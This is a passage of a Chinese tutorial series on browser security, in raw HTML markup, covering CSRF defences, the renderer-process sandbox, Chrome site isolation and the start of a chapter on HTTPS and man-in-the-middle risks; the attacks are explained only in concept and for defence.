9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>总结</h2>\n<p>我们结合一个实际案例介绍了 CSRF 攻击，要发起 CSRF 攻击需要具备三个条件：目标站点存在漏洞、用户要登录过目标站点和黑客需要通过第三方站点发起攻击。</p>\n<p>根据这三个必要条件，我们又介绍了该如何防止 CSRF 攻击，具体来讲主要有三种方式：充分利用好 Cookie 的 SameSite 属性、验证请求的来源站点和使用 CSRF Token。这三种方式需要合理搭配使用，这样才可以有效地防止 CSRF 攻击。</p>\n<p>再结合前面两篇文章，我们可以得出页面安全问题的主要原因就是浏览器为同源策略开的两个“后门”：一个是在页面中可以任意引用第三方资源，另外一个是通过 CORS 策略让 XMLHttpRequest 和 Fetch 去跨域请求资源。</p>\n<p>为了解决这些问题，我们引入了 CSP 来限制页面任意引入外部资源，引入了 HttpOnly 机制来禁止 XMLHttpRequest 或者 Fetch 发送一些关键 Cookie，引入了 SameSite 和 Origin 来防止 CSRF 攻击。</p>\n<p>通过这三篇文章的分析，相信你应该已经能搭建 Web 页面安全的知识体系网络了。有了这张网络，你就可以将 HTTP 请求头和响应头中各种安全相关的字段关联起来，比如 Cookie 中的一些字段，还有 X-Frame-Options、X-Content-Type-Options、X-XSS-Protection 等字段，也可以将 CSP、CORS 这些知识点关联起来。当然这些并不是浏览器安全的全部，后面两篇文章我们还会介绍</p>\n<h1 id="沙盒：页面和系统之间的隔离墙"><a href="#%E6%B2%99%E7%9B%92%EF%BC%9A%E9%A1%B5%E9%9D%A2%E5%92%8C%E7%B3%BB%E7%BB%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E9%9A%94%E7%A6%BB%E5%A2%99" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>沙盒：页面和系统之间的隔离墙</h1>\n<p>从稳定性视角来看，单进程架构的浏览器是不稳定的，因为只要浏览器进程中的任意一个功能出现异常都有可能影响到整个浏览器，如页面卡死、浏览器崩溃等。不过浏览器的稳定性并不是本文讨论的重点，我们今天主要聊的是浏览器架构是如何影响到操作系统安全的</p>\n<p>浏览器本身的漏洞是单进程浏览器的一个主要问题，如果浏览器被曝出存在漏洞，那么在这些漏洞没有被及时修复的情况下，黑客就有可能通过恶意的页面向浏览器中注入恶意程序，其中最常见的攻击方式是利用缓冲区溢出，不过需要注意这种类型的攻击和 XSS 注入的脚本是不一样的</p>\n<ul>\n<li>XSS 攻击只是将恶意的 JavaScript 脚本注入到页面中，虽然能窃取一些 Cookie 相关的数据，但是 XSS 无法对操作系统进行攻击。</li>\n<li>而通过浏览器漏洞进行的攻击是可以入侵到浏览器进程内部的，可以读取和修改浏览器进程内部的任意内容，还可以穿透浏览器，在用户的操作系统上悄悄地安装恶意软件、监听用户键盘输入信息以及读取用户硬盘上的文件内容。</li>\n</ul>\n<blockquote>\n<p>和 XSS 攻击页面相比，这类攻击无疑是枚“核弹”，它会将整个操作系统的内容都暴露给黑客，这样我们操作系统上所有的资料都是不安全的了。</p>\n</blockquote>\n<h2 id="安全视角下的多进程架构"><a href="#%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84%E5%A4%9A%E8%BF%9B%E7%A8%8B%E6%9E%B6%E6%9E%84" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>安全视角下的多进程架构</h2>\n<p>现代浏览器的设计目标是安全、快速和稳定，而这种核弹级杀伤力的安全问题就是一个很大的潜在威胁，因此在设计现代浏览器的体系架构时，需要解决这个问题。</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-15-14-57-34-4af345b586cbe0c03b1d0a1c1737d5ae-09eb7.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 89.66725043782837%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAYAAABb0P4QAAAACXBIWXMAAAsSAAALEgHS3X78AAAC7UlEQVQ4y5WU32sUVxTH8/f4UJAIffFHQlsRRIUWGn0qgtgnReyTpVCKrzaNpVXaxWgWTBvNPkhYaeOu2CJZrY2kiW53E/fHZHfd3cz+mF93Z2d2Zj/emRBoIG7sgcO5nMv53O+cc+cO8R/r9/thtOtVqktP2XjxN/Xlv6ilHlJ/+mgzrjyT+UVqz1M47da2usCGdgIaJYVbyX+5mlC4lsgRia/w0/00N+aWuJ7IM5Fc55f5JdyWugvQ39zQ14ucilYZjriM3uwwFnP5+I7LyZjDB7ds9kZ6fD6VB22D/rsBFU5P1zh4w2L0eoX9EzlGIy0O/FDm0Pd59k/anL/9v4FVRqI9PprUGblWYeTHsoxlPow0OBj1dwcGyS2gphQYi9Z476rK8JVX7Jso8/7PFsPjCvvGC+z5tsKZydVtwC3o0M5TrnE/+Q93Exmm48+J3ntGLJlh5rdlZh+8YGY+TSK5iG+03z6UrWQQu90uuAK8Dq7RxBebhZ4pr0nfkSvpfZee522r2xHo+z7tdptcoch6uYJmmNTVJkqpHMZO10HYXTrSbdvGdZ3dgYZhkE6nKRaLCCEoFAqkUimq1SqqbEe71cJ3BPXCMh1hDgYG1mw2WVtbC4GB2rAF0kzTZKNWw9B1PAnsGq9xHHsw0HVdVLXBqgQqikJLqtElINgPFHY6ndCFkNF26PW8wcBAkWVZYX8CL5VKZLJZstIzmQz5fF6CbISEWsIKDxsIDPrn9XryTvrh6XX5iWUJDRS/lgoDlQS3r+8Ff8I7AHWNiT81LsQFX84LvlvoElu2+CrpcCnhEFsRfP3A4LOY4MKcTq7S3BzmW4Famy/iJsd+7XFKPgrn4jbjf2h8csfh01mXK480zt4TnJjxODEteKk0BgN1Cbw41+L4bcHYjMX5OZPL8ypHpkwOT1l883uT07Na+HAcnWrzsqjuotDQWcpvkFptsJBVWcw1yKyr4XpB5jKlRph7nG3wZFWl0dK21b8BpjolTqEOhNcAAAAASUVORK5CYII=\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 15 14 57 34" title="" data-src="/static/2021-07-15-14-57-34-4af345b586cbe0c03b1d0a1c1737d5ae-fee1c.png" data-srcset="/static/2021-07-15-14-57-34-4af345b586cbe0c03b1d0a1c1737d5ae-a67b7.png 200w,\n/static/2021-07-15-14-57-34-4af345b586cbe0c03b1d0a1c1737d5ae-0b187.png 400w,\n/static/2021-07-15-14-57-34-4af345b586cbe0c03b1d0a1c1737d5ae-fee1c.png 800w,\n/static/2021-07-15-14-57-34-4af345b586cbe0c03b1d0a1c1737d5ae-09eb7.png 1142w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>观察上图，我们知道浏览器被划分为浏览器内核和渲染内核两个核心模块，其中浏览器内核是由网络进程、浏览器主进程和 GPU 进程组成的，渲染内核就是渲染进程。那如果我们在浏览器中打开一个页面，这两个模块是怎么配合的呢？</p>\n<p>所有的网络资源都是通过浏览器内核来下载的，下载后的资源会通过 IPC 将其提交给渲染进程（浏览器内核和渲染进程之间都是通过 IPC 来通信的）。然后渲染进程会对这些资源进行解析、绘制等操作，最终生成一幅图片。但是渲染进程并不负责将图片显示到界面上，而是将最终生成的图片提交给浏览器内核模块，由浏览器内核模块负责显示这张图片。</p>\n<p>设计现代浏览器体系架构时，将浏览器划分为不同的进程是为了增加其稳定性。虽然设计成了多进程架构，不过这些模块之间的沟通方式却有些复杂，也许你还有以下问题：</p>\n<ul>\n<li>为什么一定要通过浏览器内核去请求资源，再将数据转发给渲染进程，而不直接从进程内部去请求网络资源？</li>\n<li>为什么渲染进程只负责生成页面图片，生成图片还要经过 IPC 通知浏览器内核模块，然后让浏览器内核去负责展示图片？</li>\n</ul>\n<p>通过以上方式不是增加了工程的复杂度吗？</p>\n<p>要解释现代浏览器为什么要把这个流程弄得这么复杂，我们就得从系统安全的角度来分析。</p>\n<h2 id="安全沙箱"><a href="#%E5%AE%89%E5%85%A8%E6%B2%99%E7%AE%B1" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>安全沙箱</h2>\n<p>不过在解释这些问题之前，我们得先看看什么是安全沙箱。</p>\n<p>上面我们分析过了，由于渲染进程需要执行 DOM 解析、CSS 解析、网络图片解码等操作，如果渲染进程中存在系统级别的漏洞，那么以上操作就有可能让恶意的站点获取到渲染进程的控制权限，进而又获取操作系统的控制权限，这对于用户来说是非常危险的。</p>\n<p>因为网络资源的内容存在着各种可能性，所以浏览器会默认所有的网络资源都是不可信的，都是不安全的。但谁也不能保证浏览器不存在漏洞，只要出现漏洞，黑客就可以通过网络内容对用户发起攻击。</p>\n<p>我们知道，如果你下载了一个恶意程序，但是没有执行它，那么恶意程序是不会生效的。同理，浏览器之于网络内容也是如此，浏览器可以安全地下载各种网络资源，但是如果要执行这些网络资源，比如解析 HTML、解析 CSS、执行 JavaScript、图片编解码等操作，就需要非常谨慎了，因为一不小心，黑客就会利用这些操作对含有漏洞的浏览器发起攻击。</p>\n<p>基于以上原因，我们需要在渲染进程和操作系统之间建一道墙，即便渲染进程由于存在漏洞被黑客攻击，但由于这道墙，黑客就获取不到渲染进程之外的任何操作权限。将渲染进程和操作系统隔离的这道墙就是我们要聊的安全沙箱</p>\n<p>浏览器中的安全沙箱是利用操作系统提供的安全技术，让渲染进程在执行过程中无法访问或者修改操作系统中的数据，在渲染进程需要访问系统资源的时候，需要通过浏览器内核来实现，然后将访问的结果通过 IPC 转发给渲染进程。</p>\n<p>安全沙箱最小的保护单位是进程。因为单进程浏览器需要频繁访问或者修改操作系统的数据，所以单进程浏览器是无法被安全沙箱保护的，而现代浏览器采用的多进程架构使得安全沙箱可以发挥作用。</p>\n<h2 id="安全沙箱如何影响各个模块功能"><a href="#%E5%AE%89%E5%85%A8%E6%B2%99%E7%AE%B1%E5%A6%82%E4%BD%95%E5%BD%B1%E5%93%8D%E5%90%84%E4%B8%AA%E6%A8%A1%E5%9D%97%E5%8A%9F%E8%83%BD" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>安全沙箱如何影响各个模块功能</h2>\n<p>我们知道安全沙箱最小的保护单位是进程，并且能限制进程对操作系统资源的访问和修改，这就意味着如果要让安全沙箱应用在某个进程上，那么这个进程必须没有读写操作系统的功能，比如读写本地文件、发起网络请求、调用 GPU 接口等。</p>\n<p>了解了被安全沙箱保护的进程会有一系列的受限操作之后，接下来我们就可以分析渲染进程和浏览器内核各自都有哪些职责，如下图：</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-15-14-58-41-4e8163f0ddaf38e6d73d504da6195726-09eb7.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 64.44833625218914%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAAsSAAALEgHS3X78AAABB0lEQVQoz3WR5w6EQAiEff+XtMXe69nvvkjCJbrLDwPIwMys833FeZ6fO47j4Lvvu5Truj4mnQfsui7mXNf1PK9t277vu66j9H0/SRIZMIM5Utd1URRlWY7jyJY0TUmmaWqahl38omkGE4zmeR5F0TzPlMMwcIqcZlVVcRwvy0Jf7v/BUnOEIQ7CQsHbtsEICayQvvUyDBlVsOjMsiwMQ5ibNUu3ugN6ok3BbMQweBncFiQAdZhpmgImYMRxvtanQhswBOMqJimYRIyktIIlEMwKyRUMoyAIrJo1eOQ3mI0gzZpVNvR4ZAwDQ4l+4YxgDAOPKD3+vIxsALglYEp5fDoYQQIFBf8AWt70rFmp9BAAAAAASUVORK5CYII=\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 15 14 58 41" title="" data-src="/static/2021-07-15-14-58-41-4e8163f0ddaf38e6d73d504da6195726-fee1c.png" data-srcset="/static/2021-07-15-14-58-41-4e8163f0ddaf38e6d73d504da6195726-a67b7.png 200w,\n/static/2021-07-15-14-58-41-4e8163f0ddaf38e6d73d504da6195726-0b187.png 400w,\n/static/2021-07-15-14-58-41-4e8163f0ddaf38e6d73d504da6195726-fee1c.png 800w,\n/static/2021-07-15-14-58-41-4e8163f0ddaf38e6d73d504da6195726-09eb7.png 1142w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>通过该图，我们可以看到由于渲染进程需要安全沙箱的保护，因此需要把在渲染进程内部涉及到和系统交互的功能都转移到浏览器内核中去实现。</p>\n<p>那安全沙箱是如何影响到各个模块功能的呢？</p>\n<h3 id="持久存储"><a href="#%E6%8C%81%E4%B9%85%E5%AD%98%E5%82%A8" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>持久存储</h3>\n<p>我们先来看看安全沙箱是如何影响到浏览器持久存储的。由于安全沙箱需要负责确保渲染进程无法直接访问用户的文件系统，但是在渲染进程内部有访问 Cookie 的需求、有上传文件的需求，为了解决这些文件的访问需求，所以现代浏览器将读写文件的操作全部放在了浏览器内核中实现，然后通过 IPC 将操作结果转发给渲染进程。</p>\n<p>具体地讲，如下文件内容的读写都是在浏览器内核中完成的：</p>\n<ul>\n<li>存储 Cookie 数据的读写。通常浏览器内核会维护一个存放所有 Cookie 的 Cookie 数据库，然后当渲染进程通过 JavaScript 来读取 Cookie 时，渲染进程会通过 IPC 将读取 Cookie 的信息发送给浏览器内核，浏览器内核读取 Cookie 之后再将内容返回给渲染进程。</li>\n<li>一些缓存文件的读写也是由浏览器内核实现的，比如网络文件缓存的读取。</li>\n</ul>\n<h3 id="网络访问"><a href="#%E7%BD%91%E7%BB%9C%E8%AE%BF%E9%97%AE" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>网络访问</h3>\n<p>同样有了安全沙箱的保护，在渲染进程内部也是不能直接访问网络的，如果要访问网络，则需要通过浏览器内核。不过浏览器内核在处理 URL 请求之前，会检查渲染进程是否有权限请求该 URL，比如检查 XMLHttpRequest 或者 Fetch 是否是跨站点请求，或者检测 HTTPS 的站点中是否包含了 HTTP 的请求。</p>\n<h3 id="用户交互"><a href="#%E7%94%A8%E6%88%B7%E4%BA%A4%E4%BA%92" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>用户交互</h3>\n<p>渲染进程实现了安全沙箱，还影响到了一个非常重要的用户交互功能。</p>\n<p>通常情况下，如果你要实现一个 UI 程序，操作系统会提供一个界面给你，该界面允许应用程序与用户交互，允许应用程序在该界面上进行绘制，比如 Windows 提供的是 HWND，Linux 提供的 X Window，我们就把 HWND 和 X Window 统称为窗口句柄。应用程序可以在窗口句柄上进行绘制和接收键盘鼠标消息。</p>\n<p>不过在现代浏览器中，由于每个渲染进程都有安全沙箱的保护，所以在渲染进程内部是无法直接操作窗口句柄的，这也是为了限制渲染进程监控到用户的输入事件。</p>\n<p>由于渲染进程不能直接访问窗口句柄，所以渲染进程需要完成以下两点大的改变。</p>\n<ol>\n<li>渲染进程需要渲染出位图。为了向用户显示渲染进程渲染出来的位图，渲染进程需要将生成好的位图发送到浏览器内核，然后浏览器内核将位图复制到屏幕上。</li>\n<li>操作系统没有将用户输入事件直接传递给渲染进程，而是将这些事件传递给浏览器内核。然后浏览器内核再根据当前浏览器界面的状态来判断如何调度这些事件，如果当前焦点位于浏览器地址栏中，则输入事件会在浏览器内核内部处理；如果当前焦点在页面的区域内，则浏览器内核会将输入事件转发给渲染进程。</li>\n</ol>\n<p>之所以这样设计，就是为了限制渲染进程有监控到用户输入事件的能力，所以所有的键盘鼠标事件都是由浏览器内核来接收的，然后浏览器内核再通过 IPC 将这些事件发送给渲染进程。</p>\n<p>上面我们分析了由于渲染进程引入了安全沙箱，所以浏览器的持久存储、网络访问和用户交互等功能都不能在渲染进程内直接使用了，因此我们需要把这些功能迁移到浏览器内核中去实现，这让原本比较简单的流程变得复杂了。</p>\n<h2 id="站点隔离（site-isolation）"><a href="#%E7%AB%99%E7%82%B9%E9%9A%94%E7%A6%BB%EF%BC%88site-isolation%EF%BC%89" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>站点隔离（Site Isolation）</h2>\n<p>所谓站点隔离是指 Chrome 将同一站点（包含了相同根域名和相同协议的地址）中相互关联的页面放到同一个渲染进程中执行。</p>\n<p>最开始 Chrome 划分渲染进程是以标签页为单位，也就是说整个标签页会被划分给某个渲染进程。但是，按照标签页划分渲染进程存在一些问题，原因就是一个标签页中可能包含了多个 iframe，而这些 iframe 又有可能来自于不同的站点，这就导致了多个不同站点中的内容通过 iframe 同时运行在同一个渲染进程中。</p>\n<p>目前所有操作系统都面临着两个 A 级漏洞——幽灵（Spectre）和熔毁（Meltdown），这两个漏洞是由处理器架构导致的，很难修补，黑客通过这两个漏洞可以直接入侵到进程的内部，如果入侵的进程没有安全沙箱的保护，那么黑客还可以发起对操作系统的攻击。</p>\n<p>所以如果一个银行站点包含了一个恶意 iframe，然后这个恶意的 iframe 利用这两个 A 级漏洞去入侵渲染进程，那么恶意程序就能读取银行站点渲染进程内的所有内容了，这对于用户来说就存在很大的风险了。</p>\n<p>因此 Chrome 几年前就开始重构代码，将标签级的渲染进程重构为 iframe 级的渲染进程，然后严格按照同一站点的策略来分配渲染进程，这就是 Chrome 中的站点隔离。</p>\n<p>实现了站点隔离，就可以将恶意的 iframe 隔离在恶意进程内部，使得它无法继续访问其他 iframe 进程的内容，因此也就无法攻击其他站点了。</p>\n<p>值得注意是，2019 年 10 月 20 日 Chrome 团队宣布安卓版的 Chrome 已经全面支持站点隔离</p>\n<h1 id="https：让数据传输更安全"><a href="#https%EF%BC%9A%E8%AE%A9%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93%E6%9B%B4%E5%AE%89%E5%85%A8" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>HTTPS：让数据传输更安全</h1>\n<p>浏览器安全主要划分为三大块内容：页面安全、系统安全和网络安全。前面我们用四篇文章介绍了页面安全和系统安全，也聊了浏览器和 Web 开发者是如何应对各种类型的攻击，本文是我们专栏的最后一篇，我们就接着来聊聊网络安全协议 HTTPS。</p>\n<p>我们先从 HTTP 的明文传输的特性讲起，在上一个模块的三篇文章中我们分析过，起初设计 HTTP 协议的目的很单纯，就是为了传输超文本文件，那时候也没有太强的加密传输的数据需求，所以 HTTP 一直保持着明文传输数据的特征。但这样的话，在传输过程中的每一个环节，数据都有可能被窃取或者篡改，这也意味着你和服务器之间还可能有个中间人，你们在通信过程中的一切内容都在中间人的掌握中，如下图：</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-15-15-02-06-37f8f212eeeeb569928ab0fb7840291e-9e7f9.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 54.802259887005654%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAAsSAAALEgHS3X78AAABkElEQVQoz31RTS9DQRSd2PobIiK+umBlQUIb9jYUiYVQa/4AGwuJBImFleQJ9QsIQVoWCJoIqhGitRDy5n3NvHnz5sO8Pm2qbZzMTCZ3zj333DtASiHVFmoFl19wTj7eUe4Bv2SDV87V6fqiAFleZzriIQsUIF8+QkuHSLt0bCuACaHDxcvmSmZu7Pvt1cbYMEwPW6msNbNnzSYt7doN64GnTz++bUxq9uoJotT3fbUZpTS3uPA4P00J8RnzKJXSv3ojc/t2ImntlJO/bJ689bZS+sG9I8OYlAwj/JrzTSioV4pJ3WHnT/pNnuZhYFvFQLlL1zEQQrICoojwruyofjjzKglAPXIRyCha0LBp/plcEaoLCCFjrCRaSq7iYYzNANZZOn18enqXySgtC+OQX6UK6vq8SKUaGxoAAD3d3bs72uhA/8RwbHwoOjHYn4iPEi8chKiuzItfmnvO9ka6Is1NU+PxjfW1vtbmwc72aKQj1tYyEh1wCamfLEv2RI3JQPof25UghNi27bpu7fzK+AEo0E4+VmBSnAAAAABJRU5ErkJggg==\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 15 15 02 06" title="" data-src="/static/2021-07-15-15-02-06-37f8f212eeeeb569928ab0fb7840291e-fee1c.png" data-srcset="/static/2021-07-15-15-02-06-37f8f212eeeeb569928ab0fb7840291e-a67b7.png 200w,\n/static/2021-07-15-15-02-06-37f8f212eeeeb569928ab0fb7840291e-0b187.png 400w,\n/static/2021-07-15-15-02-06-37f8f212eeeeb569928ab0fb7840291e-fee1c.png 800w,\n/static/2021-07-15-15-02-06-37f8f212eeeeb569928ab0fb7840291e-b1a91.png 1200w,\n/static/2021-07-15-15-02-06-37f8f212eeeeb569928ab0fb7840291e-9e7f9.png 1416w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>从上图可以看出，我们使用 HTTP 传输的内容很容易被中间人窃取、伪造和篡改，通常我们把这种攻击方式称为中间人攻击</p>\n<p>具体来讲，在将 HTTP 数据提交给 TCP 层之后，数据会经过用户电脑、WiFi 路由器、运营商和目标服务器，在这中间的每个环节中，数据都有可能被窃取或篡改。比如用户电脑被黑客安装了恶意软件，那么恶意软件就能抓取和篡改所发出的 HTTP 请求的内容。或者用户一不小心连接上了 WiFi 钓鱼路由器，那么数据也都能被黑客抓取或篡改。</p>\n<h2 id="在-http-协议栈中引入安全层"><a href="#%E5%9C%A8-http-%E5%8D%8F%E8%AE%AE%E6%A0%88%E4%B8%AD%E5%BC%95%E5%85%A5%E5%AE%89%E5%85%A8%E5%B1%82" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>在 HTTP 协议栈中引入安全层</h2>\n<p>鉴于 HTTP 的明文传输使得传输过程毫无安全性可言，且制约了网上购物、在线转账等一系列场景应用，于是倒逼着我们要引入加密方案</p>\n<p>从 HTTP 协议栈层面来看，我们可以在 TCP 和 HTTP 之间插入一个安全层，所有经过安全层的数据都会被加密或者解密，你可以参考下图：</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" 